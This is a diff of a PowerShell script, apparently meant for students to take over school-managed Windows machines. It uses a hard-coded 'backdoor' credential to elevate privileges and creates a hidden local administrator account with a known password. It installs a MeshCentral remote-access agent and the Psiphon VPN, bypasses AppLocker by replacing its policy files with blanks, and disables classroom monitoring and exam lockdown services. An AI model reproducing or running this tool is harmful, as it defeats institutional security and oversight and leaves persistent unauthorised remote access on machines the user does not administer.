@@ -1,6 +1,6 @@
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Initialization                                                                              │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Initialization                                                                           │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
 	<#┌─────────────────────────────────────────────┐
 	  │ Important Script Settings                   │
 	  └─────────────────────────────────────────────┘#>
@@ -13,38 +13,38 @@
 		[Environment]::SystemDirectory | Set-Location
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Variable Declarations                       │
-	  └─────────────────────────────────────────────┘#>
-		$Build = "4.0.2"
-		$Admin = "slashpowered"
-
-		$LocalUser = "CertiportAdmin"
-		$LocalPswd = "C3rt!p0r+"
-
-		$global:HostsPath = "$env:WINDIR\System32\drivers\etc\hosts"
-		$global:HostsContent = Get-Content -Path $global:HostsPath
-
-	<#┌─────────────────────────────────────────────┐
-	  │ Assembly for Messageboxes                   │
+	  │ Load Windows Forms                          │
 	  └─────────────────────────────────────────────┘#>
 		Add-Type -AssemblyName System.Windows.Forms
 		[Windows.Forms.Application]::EnableVisualStyles()
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Functions                                   │
+	  │ Variable Declarations                       │
+	  └─────────────────────────────────────────────┘#>
+		$Build = "4.0.2"
+		$Admin = "slashpowered"
+
+		$BackdoorUser = "CertiportAdmin"
+		$BackdoorPass = "C3rt!p0r+"
+
+		$global:HostsPath = "$env:WINDIR\System32\drivers\etc\hosts"
+		$global:HostsContent = Get-Content -LiteralPath $global:HostsPath
+
+	<#┌─────────────────────────────────────────────┐
+	  │ Function Declarations                       │
 	  └─────────────────────────────────────────────┘#>
 		function Show-Popup {
 			[CmdletBinding()]
 			param (
 				[Parameter(Mandatory)]
-				[ValidateNotNullorEmpty()]
+				[ValidateNotNullOrEmpty()]
 				[string] $Message,
 
-				[ValidateNotNullorEmpty()]
+				[ValidateNotNullOrEmpty()]
 				[ValidateSet("OK", "OKCancel", "AbortRetryIgnore", "YesNo", "YesNoCancel", "RetryCancel")]
 				[string] $Options = "OK",
 
-				[ValidateNotNullorEmpty()]
+				[ValidateNotNullOrEmpty()]
 				[ValidateSet("Error", "Question", "Warning", "Information")]
 				[string] $Level = "Information"
 			)
@@ -81,36 +81,36 @@
 			$EscapedHostname = [Regex]::Escape($Hostname)
 			$PatternToMatch = ".*$Address\s+$EscapedHostname.*"
 
-			if (!($global:HostsContent -match $PatternToMatch)) {
-				Add-Content -Path $global:HostsPath -Value "$Address	$Hostname" -Force -Encoding UTF8
+			if ($global:HostsContent -notmatch $PatternToMatch) {
+				Add-Content -LiteralPath $global:HostsPath -Value "$Address	$Hostname" -Force
 			}
 		}
 
 
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Process Elevation                                                                           │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
-	$SecurePswd = ConvertTo-SecureString -String $LocalPswd -AsPlainText -Force
-	$LocalAuth = New-Object -TypeName Management.Automation.PSCredential -ArgumentList "$env:COMPUTERNAME\$LocalUser", $SecurePswd
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Process Elevation                                                                        │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
+	$SecurePass = ConvertTo-SecureString -String $BackdoorPass -AsPlainText -Force
+	$BackdoorAuth = New-Object -TypeName Management.Automation.PSCredential -ArgumentList "$env:COMPUTERNAME\$BackdoorUser", $SecurePass
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Elevate the Console Process                  │
+	  │ Elevate the Console Process                 │
 	  └─────────────────────────────────────────────┘#>
 		if ([Environment]::UserName -ne $LocalUser) {
 			try {
-				Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -Command &{ Start-Process -FilePath 'PowerShell.exe' -ArgumentList '-NoProfile -Command &{ takeown.exe /R /A /F ''$PSScriptRoot'' /D N; icacls.exe ''$PSScriptRoot'' /grant ''Everyone:(OI)(CI)F'' /T /C; Start-Process -FilePath ''PowerShell.exe'' -ArgumentList ''-NoProfile -File $PSCommandPath -ExecutionPolicy Bypass'' }' -Verb RunAs -WindowStyle Hidden }" -Credential $LocalAuth -WindowStyle Hidden -ErrorAction Stop
+				Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -Command &{ Start-Process -FilePath 'PowerShell.exe' -ArgumentList '-NoProfile -Command &{ takeown.exe /R /A /F ''$PSScriptRoot'' /D N; icacls.exe ''$PSScriptRoot'' /grant ''Everyone:(OI)(CI)F'' /T /C; Start-Process -FilePath ''PowerShell.exe'' -ArgumentList ''-NoProfile -File $PSCommandPath -ExecutionPolicy Bypass'' }' -Verb RunAs -WindowStyle Hidden }" -Credential $BackdoorAuth -WindowStyle Hidden -ErrorAction Stop
 			}
 			catch {
-				Show-Popup -Message "Failed to apply folder permissions. $_" -Level "Error"
+				Show-Popup -Message "Failed to apply directory permissions. $_" -Level "Error"
 			}
 
 			Exit
 		}
 
 
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Pre-Installation                                                                            │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Pre-Installation                                                                         │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
 	<#┌─────────────────────────────────────────────┐
 	  │ Terminate Monitoring Processes              │
 	  └─────────────────────────────────────────────┘#>
@@ -133,41 +133,41 @@
 	<#┌─────────────────────────────────────────────┐
 	  │ Check Installation Status                   │
 	  └─────────────────────────────────────────────┘#>
-		# If the slashpowered account folder exists, prompt for Uninstall/Update. If not found, assume not installed.
-			if (Test-Path -LiteralPath "$env:systemdrive\Users\$Admin") {
-				$UpdatePrompt = Show-Popup -Message "ADminify is already installed on this machine. `nWould you like to update [Yes] or uninstall [No]?" -Options "YesNoCancel" -Level "Question"
+		# If the slashpowered directory exists, prompt for selection. If not found, assume not installed.
+			if (Test-Path -LiteralPath "$env:SYSTEMDRIVE\Users\$Admin") {
+				$UpdatePrompt = Show-Popup -Message "ADminify is already installed on this machine.`nWould you like to update [Yes] or uninstall [No]?" -Options "YesNoCancel" -Level "Question"
 
 				switch ($UpdatePrompt) {
 					"Yes" {
-						$InstallMode = "Update" # Runs Uuinstallation, installation, then RESTARTS.
+						$InstallMode = "Update" # Run the uninstall, reinstall, then RESTART.
 					}
 					"No" {
-						$InstallMode = "Uninstall" # Runs uninstallation, then EXITS.
+						$InstallMode = "Uninstall" # Run the uninstall, then RESTART.
 					}
 					"Cancel" {
-						$InstallMode = "Exit" # Skips install/uninstall, then EXITS.
+						$InstallMode = "Exit" # Make no system changes, then EXIT.
 					}
 				}
 			}
 			else {
-				$InstallMode = "Install" # Runs Installation section only, then RESTARTS.
+				$InstallMode = "Install" # Runs the install, then RESTART.
 			}
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Create Slash Folder                         │
+	  │ Create Temporary Folder                     │
 	  └─────────────────────────────────────────────┘#>
-		if (!(Test-Path -Path "$env:systemdrive\slashpowered")) {
-			New-Item -Path "$env:systemdrive\" -Name "slashpowered" -ItemType Directory -Force > $null
+		if (!(Test-Path -LiteralPath "$env:SYSTEMDRIVE\slashpowered")) {
+			New-Item -Path "$env:SYSTEMDRIVE\" -Name "slashpowered" -ItemType Directory -Force > $null
 		}
 
 	<#┌─────────────────────────────────────────────┐
 	  │ 7-Zip Initialization                        │
 	  └─────────────────────────────────────────────┘#>
-		if (Test-Path -Path "$env:ProgramFiles\7-Zip\7z.exe") {
-			Set-Alias -Name "7z" -Value "$env:ProgramFiles\7-Zip\7z.exe"
+		if (Test-Path -LiteralPath "$env:PROGRAMFILES\7-Zip\7z.exe") {
+			Set-Alias -Name "7z" -Value "$env:PROGRAMFILES\7-Zip\7z.exe"
 		}
-		elseif (Test-Path -Path "$env:ProgramFiles(x86)\7-Zip\7z.exe") {
-			Set-Alias -Name "7z" -Value "$env:ProgramFiles(x86)\7-Zip\7z.exe"
+		elseif (Test-Path -LiteralPath "$env:PROGRAMFILES(x86)\7-Zip\7z.exe") {
+			Set-Alias -Name "7z" -Value "$env:PROGRAMFILES(x86)\7-Zip\7z.exe"
 		}
 		else {
 			Show-Popup -Message "Unable to find 7-Zip on this machine. $_" -Level "Error"
@@ -176,9 +176,9 @@
 
 
 if ($InstallMode -eq "Uninstall" -or $InstallMode -eq "Update") {
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Uninstallation                                                                              │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Uninstallation                                                                           │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
 	<#┌─────────────────────────────────────────────┐
 	  │ Account Removal                             │
 	  └─────────────────────────────────────────────┘#>
@@ -204,15 +204,15 @@ if ($InstallMode -eq "Uninstall" -or $InstallMode -eq "Update") {
 	  │ Uninstall MeshCentral Agent                 │
 	  └─────────────────────────────────────────────┘#>
 		if (Test-Path -LiteralPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\MeshCentralAgent") {
-			# Run setup wizard
+			# Run the silent uninstaller.
 				Start-Process -FilePath "$PSScriptRoot\Programs\MeshCentral\meshagent64.exe" -ArgumentList "-fulluninstall" -NoNewWindow -Wait
 		}
 
 	<#┌─────────────────────────────────────────────┐
 	  │ Uninstall Psiphon VPN                       │
 	  └─────────────────────────────────────────────┘#>
-		if (Test-Path -LiteralPath "$env:ProgramFiles\Psiphon") {
-			Remove-Item -LiteralPath "$env:ProgramFiles\Psiphon" -Recurse -Force
+		if (Test-Path -LiteralPath "$env:PROGRAMFILES\Psiphon") {
+			Remove-Item -LiteralPath "$env:PROGRAMFILES\Psiphon" -Recurse -Force
 		}
 
 	<#┌─────────────────────────────────────────────┐
@@ -221,40 +221,40 @@ if ($InstallMode -eq "Uninstall" -or $InstallMode -eq "Update") {
 		Write-Host "[INFO] Checking for AppLocker bypass method..."
 
 		# Gain access to AppLocker policies folder.
-			takeown.exe /R /A /F "$env:windir\System32\AppLocker" /D N > $null
-			icacls.exe "$env:windir\System32\AppLocker" /grant "Administrators:(OI)(CI)F" /T /C > $null
+			takeown.exe /R /A /F "$env:WINDIR\System32\AppLocker" /D N > $null
+			icacls.exe "$env:WINDIR\System32\AppLocker" /grant "Administrators:(OI)(CI)F" /T /C > $null
 
 		# Restore AppLocker policies and remove (if existing) auto-restored ones.
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Appx.AppLocker.slash" -PathType Leaf) {
-				Remove-Item -Path "$env:windir\System32\AppLocker\Appx.AppLocker" -Force -ErrorAction SilentlyContinue
-				Rename-Item -Path "$env:windir\System32\AppLocker\Appx.AppLocker.slash" -NewName "Appx.AppLocker" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Appx.AppLocker.slash" -PathType Leaf) {
+				Remove-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Appx.AppLocker" -Force -ErrorAction SilentlyContinue
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Appx.AppLocker.slash" -NewName "Appx.AppLocker" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Dll.AppLocker.slash" -PathType Leaf) {
-				Remove-Item -Path "$env:windir\System32\AppLocker\Dll.AppLocker" -Force -ErrorAction SilentlyContinue
-				Rename-Item -Path "$env:windir\System32\AppLocker\Dll.AppLocker.slash" -NewName "Dll.AppLocker" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Dll.AppLocker.slash" -PathType Leaf) {
+				Remove-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Dll.AppLocker" -Force -ErrorAction SilentlyContinue
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Dll.AppLocker.slash" -NewName "Dll.AppLocker" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Exe.AppLocker.slash" -PathType Leaf) {
-				Remove-Item -Path "$env:windir\System32\AppLocker\Exe.AppLocker" -Force -ErrorAction SilentlyContinue
-				Rename-Item -Path "$env:windir\System32\AppLocker\Exe.AppLocker.slash" -NewName "Exe.AppLocker" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Exe.AppLocker.slash" -PathType Leaf) {
+				Remove-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Exe.AppLocker" -Force -ErrorAction SilentlyContinue
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Exe.AppLocker.slash" -NewName "Exe.AppLocker" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Msi.AppLocker.slash" -PathType Leaf) {
-				Remove-Item -Path "$env:windir\System32\AppLocker\Msi.AppLocker" -Force -ErrorAction SilentlyContinue
-				Rename-Item -Path "$env:windir\System32\AppLocker\Msi.AppLocker.slash" -NewName "Msi.AppLocker" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Msi.AppLocker.slash" -PathType Leaf) {
+				Remove-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Msi.AppLocker" -Force -ErrorAction SilentlyContinue
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Msi.AppLocker.slash" -NewName "Msi.AppLocker" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Script.AppLocker.slash" -PathType Leaf) {
-				Remove-Item -Path "$env:windir\System32\AppLocker\Script.AppLocker" -Force -ErrorAction SilentlyContinue
-				Rename-Item -Path "$env:windir\System32\AppLocker\Script.AppLocker.slash" -NewName "Script.AppLocker" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Script.AppLocker.slash" -PathType Leaf) {
+				Remove-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Script.AppLocker" -Force -ErrorAction SilentlyContinue
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Script.AppLocker.slash" -NewName "Script.AppLocker" -Force
 			}
 
 		# Enable VerifiedPublisherCertStoreCheck scheduled task.
 			Enable-ScheduledTask -TaskName "VerifiedPublisherCertStoreCheck" -TaskPath "\Microsoft\Windows\AppID\" > $null
 
 		# Enable Application Identity service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc" -Name "Start" -Value 2 -Type DWord -Force
 
 		# Update AppLocker ruleset with restored definitions.
 			Start-ScheduledTask -TaskName "VerifiedPublisherCertStoreCheck" -TaskPath "\Microsoft\Windows\AppID\" > $null
@@ -267,19 +267,19 @@ if ($InstallMode -eq "Uninstall" -or $InstallMode -eq "Update") {
 		Write-Host "[INFO] Restoring disabled services and scheduled tasks..."
 
 		# Services
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AdobeARMservice" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AGSService" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Certiport.Lockdown.Service" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertiportNow" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ChromeManager" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolStudent" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolHelper" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LMA_Service" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SML PingBack" -Name "Start" -Value 2 -Type DWord -Force
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\xdADWSService" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AdobeARMservice" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AGSService" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\Certiport.Lockdown.Service" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\CertiportNow" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\ChromeManager" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolStudent" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\LanSchoolHelper" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\LMA_Service" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\SML PingBack" -Name "Start" -Value 2 -Type DWord -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\xdADWSService" -Name "Start" -Value 2 -Type DWord -Force
 
 			if (Test-Path -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AGMService") {
-				Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AGMService" -Name "Start" -Value 2 -Type DWord -Force
+				Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AGMService" -Name "Start" -Value 2 -Type DWord -Force
 			}
 
 		# Scheduled Tasks
@@ -292,12 +292,12 @@ if ($InstallMode -eq "Uninstall" -or $InstallMode -eq "Update") {
 			Get-ScheduledTask -TaskName "AdobeGCInvoker-*" | Enable-ScheduledTask > $null
 
 		# Startup
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeGCInvoker-1.0" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeAAMUpdater-1.0" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "xdADWSClient" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Acrobat Assistant 8.0" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Teacher" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "Capture.lnk" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeGCInvoker-1.0" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "AdobeAAMUpdater-1.0" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "xdADWSClient" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Acrobat Assistant 8.0" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Teacher" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "Capture.lnk" -Value ([byte[]](0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		Write-Host "[INFO] Services and scheduled tasks restored."
 
@@ -352,148 +352,148 @@ if ($InstallMode -eq "Uninstall" -or $InstallMode -eq "Update") {
 
 
 if ($InstallMode -eq "Install" -or $InstallMode -eq "Update") {
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Installation                                                                                │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Installation                                                                             │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
 	<#┌─────────────────────────────────────────────┐
 	  │ Administrator Account Creation              │
 	  └─────────────────────────────────────────────┘#>
-		# Prompt full name so it doesn't show "slashpowered" on login.
+		# Prompt for the student's full name so it doesn't show "slashpowered" on login.
 			$StudentName = Read-Host -Prompt "`n[USER] Please enter your student name (LAST, FIRST M.)"
 
-		# Create new local machine account.
-			Write-Host "`n[INFO] Creating `"slashpowered`" local profile..."
+		# Create a new local user account.
+			Write-Host "`n[INFO] Creating `"slashpowered`" local user account..."
 
-			# PowerShell requires secure string for password, smh...
+			# PowerShell requires a secure string for this... WTF >:(
 				$AdminPswd = ConvertTo-SecureString $Admin -AsPlainText -Force
 
 			New-LocalUser -Name $Admin -Password $AdminPswd -FullName $StudentName -PasswordNeverExpires -UserMayNotChangePassword -AccountNeverExpires > $null
 
-		# Variable cleanup.
+		# Clean up the variables.
 			Remove-Variable StudentName
 			Remove-Variable AdminPswd
 
-		# Invite slashpowered to the local administrator party. :)
-			Write-Host "[INFO] Adding profile to `"Administrators`" local group..."
+		# Invite slashpowered to the local administrator party! :)
+			Write-Host "[INFO] Adding account to `"Administrators`" local group..."
 			Add-LocalGroupMember -Group "Administrators" -Member $Admin
 
 
-<#┌─────────────────────────────────────────────────────────────────────────────────────────────┐
-  │ Post-Installation                                                                           │
-  └─────────────────────────────────────────────────────────────────────────────────────────────┘#>
+<#┌──────────────────────────────────────────────────────────────────────────────────────────┐
+  │ Post-Installation                                                                        │
+  └──────────────────────────────────────────────────────────────────────────────────────────┘#>
 	<#┌─────────────────────────────────────────────┐
 	  │ Install MeshCentral Agent                   │
 	  └─────────────────────────────────────────────┘#>
-		# Run setup wizard
+		# Run the silent installer.
 			Start-Process -FilePath "$PSScriptRoot\Programs\MeshCentral\meshagent64.exe" -ArgumentList "-fullinstall" -NoNewWindow -Wait
 
 	<#┌─────────────────────────────────────────────┐
 	  │ Install Psiphon VPN                         │
 	  └─────────────────────────────────────────────┘#>
-		# Extract archive
+		# Extract and remove the archive.
 			Write-Host "[INFO] Extracting Psiphon VPN..."
 
 			7z x "$PSScriptRoot\Programs\Psiphon\Psiphon.7z" -o"$env:ProgramFiles\Psiphon" -aoa -y > $null
 			Remove-Item -LiteralPath "$PSScriptRoot\Programs\Psiphon\Psiphon.7z" -Force
 
 	<#┌─────────────────────────────────────────────┐
-	  │ Disable AppLocker Policies                  │
+	  │ Unblock All Executable Files                │
 	  └─────────────────────────────────────────────┘#>
-		# Gain access to AppLocker policies folder.
-			takeown.exe /R /A /F "$env:windir\System32\AppLocker" /D N > $null
-			icacls.exe "$env:windir\System32\AppLocker" /grant "Administrators:(OI)(CI)F" /T /C > $null
+		# Take ownership of the AppLocker directory.
+			takeown.exe /R /A /F "$env:WINDIR\System32\AppLocker" /D N > $null
+			icacls.exe "$env:WINDIR\System32\AppLocker" /grant "Administrators:(OI)(CI)F" /T /C > $null
 
-		# Swap original AppLocker definitions with blanks.
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Appx.AppLocker" -PathType Leaf) {
-				Rename-Item -Path "$env:windir\System32\AppLocker\Appx.AppLocker" -NewName "Appx.AppLocker.slash" -Force
+		# Bypass the AppLocker definitions by replacing them with blanks.
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Appx.AppLocker" -PathType Leaf) {
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Appx.AppLocker" -NewName "Appx.AppLocker.slash" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Dll.AppLocker" -PathType Leaf) {
-				Rename-Item -Path "$env:windir\System32\AppLocker\Dll.AppLocker" -NewName "Dll.AppLocker.slash" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Dll.AppLocker" -PathType Leaf) {
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Dll.AppLocker" -NewName "Dll.AppLocker.slash" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Exe.AppLocker" -PathType Leaf) {
-				Rename-Item -Path "$env:windir\System32\AppLocker\Exe.AppLocker" -NewName "Exe.AppLocker.slash" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Exe.AppLocker" -PathType Leaf) {
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Exe.AppLocker" -NewName "Exe.AppLocker.slash" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Msi.AppLocker" -PathType Leaf) {
-				Rename-Item -Path "$env:windir\System32\AppLocker\Msi.AppLocker" -NewName "Msi.AppLocker.slash" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Msi.AppLocker" -PathType Leaf) {
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Msi.AppLocker" -NewName "Msi.AppLocker.slash" -Force
 			}
 
-			if (Test-Path -Path "$env:windir\System32\AppLocker\Script.AppLocker" -PathType Leaf) {
-				Rename-Item -Path "$env:windir\System32\AppLocker\Script.AppLocker" -NewName "Script.AppLocker.slash" -Force
+			if (Test-Path -LiteralPath "$env:WINDIR\System32\AppLocker\Script.AppLocker" -PathType Leaf) {
+				Rename-Item -LiteralPath "$env:WINDIR\System32\AppLocker\Script.AppLocker" -NewName "Script.AppLocker.slash" -Force
 			}
 
-		# Update AppLocker ruleset definitions.
+		# Force update the active AppLocker definitions.
 			Start-ScheduledTask -TaskName "VerifiedPublisherCertStoreCheck" -TaskPath "\Microsoft\Windows\AppID\" > $null
 
-		# Disable VerifiedPublisherCertStoreCheck scheduled task.
+		# Disable automatic AppLocker definition updates.
 			Disable-ScheduledTask -TaskName "VerifiedPublisherCertStoreCheck" -TaskPath "\Microsoft\Windows\AppID\" > $null
 
-		# Disable Application Identity service startup.
-			Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc" -Name "Start" -Value 4 -Type DWord -Force
+		# Disable the Application Identity service.
+			Set-ItemProperty -LiteralPath "HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc" -Name "Start" -Value 4 -Type DWord -Force
 
 	<#┌─────────────────────────────────────────────┐
 	  │ Disable Monitoring Processes                │
 	  └─────────────────────────────────────────────┘#>
 		# LanSchool Student startup.
-			Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Teacher" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
+			Set-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32" -Name "Teacher" -Value ([byte[]](0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)) -Type Binary -Force
 
 		# LanSchool Student service startup.
